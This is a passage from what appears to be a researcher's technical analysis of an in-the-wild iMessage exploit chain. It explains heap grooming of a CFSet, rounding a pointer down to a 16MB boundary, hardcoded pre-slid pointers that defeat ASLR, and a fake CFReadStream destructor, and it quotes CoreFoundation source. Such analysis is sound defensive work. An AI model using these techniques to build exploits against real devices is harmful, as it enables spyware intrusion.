 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;This has the effect of overwriting all but the last 16 bytes of the blue allocation with zeros, then overwriting the three least-significant bytes of the second-to-last pointer-sized value with &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x10 00 00&lt;/span&gt;&lt;span&gt;; which, if that memory happened to contain a pointer, has the effect of &amp;quot;shifting&amp;quot; that pointer down to the nearest 16MB boundary, then adding &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x10&lt;/span&gt;&lt;span&gt;&amp;nbsp;bytes! (For those who saw my &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://www.youtube.com/watch?v%3DZawX9I9MM6Y&quot;&gt;2024 Offensivecon talk&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;, this was the missing link between the overlapping allocations and code execution I mentioned.)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;As mentioned earlier, that&lt;/span&gt;&lt;span&gt;&amp;nbsp;blue allocation&lt;/span&gt;&lt;span&gt;&amp;nbsp;starting with &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x0003&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the backing buffer of a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFSet&lt;/span&gt;&lt;span&gt;&amp;nbsp;object from the bplist inside the WebP MakerNote. The set is constructed in a very precise fashion such that the target pointer (the one to be rounded down) ends up as the second-to-last pointer in the backing buffer. The 1MB object is then also groomed such that it falls on a 16MB boundary below the object which the CFSet entry originally points to. Then when that &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFSet&lt;/span&gt;&lt;span&gt;&amp;nbsp;is destructed it calls &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFRelease&lt;/span&gt;&lt;span&gt;&amp;nbsp;on each object, causing the fake &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFReadStream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;destructor to run.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.vdkjpva8e9lq&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Caveat II: ASLR&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;We&amp;#39;ve looked at the whole flow from huffman table overflow to &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFRelease&lt;/span&gt;&lt;span&gt;&amp;nbsp;being invoked on a fake &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFReadStream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;&amp;mdash; but there&amp;#39;s still stuff missing. The second open question I discussed earlier was ASLR. I had theorised that maybe it used a trick like a universal gadget, but is that the case?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;In addition to the samples, I was also able to obtain a number of crash logs from failed exploit attempts where those samples were thrown, which meant I could figure out the ASLR slide of the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;MessagesBlastDoorService&lt;/span&gt;&lt;span&gt;&amp;nbsp;when the exploit failed. In combination with the target device and exact OS build (also contained in the crash log) I could then obtain the matching &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;dyld_shared_cache&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;, subtract the runtime ASLR slide from a bunch of the pointer-looking things in the 1MB object and take a look at them. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The simple answer is:&lt;/span&gt;&lt;span&gt;&amp;nbsp;the 1MB object contains a large number of hardcoded, pre-slid, valid pointers. There&amp;#39;s no weird machine, tricks or universal gadget here. By the time the PKPass is built and sent by the attackers they already know both the target device type and build as well as the runtime ASLR slide of the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;MessagesBlastDoorService&lt;/span&gt;&lt;span&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Based on &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://iverify.io/post/clipping-wings-our-analysis-of-a-pegasus-spyware-sample&quot;&gt;analysis by iVerify&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;as well as analysis of &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://citizenlab.ca/2023/04/nso-groups-pegasus-spyware-returns-in-2022/&quot;&gt;earlier exploit chains published by Citizen Lab&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;, my current working theory is that the large amount of HomeKit traffic seen in those cases is likely a separate ASLR/memory disclosure exploit.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.pybpzzcf990c&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Caveat III: Pointer Authentication&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;In the years since PAC was introduced we&amp;#39;ve seen a whole spectrum of interesting ways to either defeat, or just avoid, PAC. So what did these attackers do? To understand that let&amp;#39;s follow the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFReadStream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;destruction code closely. (All these code snippets are from the most recently available version of CF from 2015, but the code doesn&amp;#39;t seem to have changed much.)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Here&amp;#39;s the definition of the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFReadStream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;CFRuntimeClass&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;__CFReadStreamClass&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c44&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c27&quot;&gt;&amp;quot;CFReadStream&amp;quot;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c29 XQFzMDWmii-c6&quot;&gt;// init&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c29 XQFzMDWmii-c6&quot;&gt;// copy&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;__CFStreamDeallocate,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c29 XQFzMDWmii-c6&quot;&gt;// copyHumanDesc&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;__CFStreamCopyDescription&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;When a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFReadStream&lt;/span&gt;&lt;span&gt;&amp;nbsp;is passed to &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFRelease&lt;/span&gt;&lt;span&gt;, it will call &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;__CFStreamDeallocate&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;__CFStreamDeallocate(CFTypeRef&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;cf)&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;*stream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;*)cf;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStreamCallBacks&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;*cb&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;=&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStreamGetCallBackPtr(stream);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;CFAllocatorRef&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;CFGetAllocator(stream);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStreamClose(stream);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;_CFStreamGetCallBackPtr&lt;/span&gt;&lt;span&gt;&amp;nbsp;just returns the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFStream&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;callBacks&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;field:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;CF_INLINE&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStreamCallBacks&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;*_CFStreamGetCallBackPtr(&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;*stream)&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;stream-&amp;gt;callBacks;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Here&amp;#39;s &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;_CFStreamClose&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;CF_PRIVATE&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStreamClose(&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;*stream)&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;CFStreamStatus&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStreamGetStatus(stream);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStreamCallBacks&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;*cb&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;=&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStreamGetCallBackPtr(stream);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;(status&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;kCFStreamStatusNotOpen&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;kCFStreamStatusClosed&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;||&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;(status&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;kCFStreamStatusError&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;__CFBitIsSet(stream-&amp;gt;flags,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;HAVE_CLOSED)&lt;/span&gt;&lt;/p&gt;
